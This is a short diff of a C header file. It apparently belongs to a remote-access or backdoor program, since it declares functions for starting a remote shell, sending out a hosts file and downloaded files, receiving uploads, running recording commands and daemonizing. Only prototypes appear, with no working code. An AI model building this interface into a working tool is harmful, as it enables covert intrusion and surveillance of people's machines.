@@ -28,13 +28,20 @@ typedef struct _CustomData
 }CustomData;
 
 void dispatch_modules(char *argv[]);
+
 void recv_upload(void);
+
 void *send_dowloaded_file(void)__attribute__((noreturn));
+void *send_dowloaded_binarie(void);
+
 void *send_hosts_file(void);
+
 void *start_remote_shell(char *argv[])__attribute__((noreturn));
-void execute_cmd(void);
+
+void *execute_cmd(void);
 void cb_message(GstBus *bus, GstMessage *msg, CustomData *data);
-void execute_record_cmd(void);
+void *execute_record_cmd(void);
+
 void daemonize(void);
 
 #endif
